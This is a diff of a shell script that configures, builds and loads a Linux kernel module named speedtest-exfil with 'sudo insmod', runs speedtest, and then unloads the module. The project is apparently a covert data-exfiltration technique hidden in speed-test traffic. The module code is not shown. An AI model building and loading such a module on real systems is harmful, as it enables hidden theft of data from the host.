@@ -45,17 +45,24 @@ sed -i "s|#define SOURCE_IP.*|#define SOURCE_IP \"$source_ip\"|" speedtest-exfil
 #test_file=${test_file:-~/speedtest-data-exfil/speedtest-exfil.txt}
 #sed -i "s|#define TEST_FILE.*|#define TEST_FILE \"$test_file\"|" speedtest-exfil.c
 
-# Build and load
+# Build
 echo ""
 echo -e "${YELLOW}Building...${NC}"
 make 
 
+# Load
+echo ""
 echo -e "${YELLOW}Loading LKM...${NC}"
 sudo insmod speedtest-exfil.ko
 
+# Run speedtest
 echo ""
 echo -e "${GREEN}Running speedtest...${NC}"
 speedtest
+
+# Cleanup
+echo ""
+echo -e "${YELLOW}Cleaning up...${NC}"
 sudo rmmod speedtest-exfil.ko && make clean
 
 echo ""
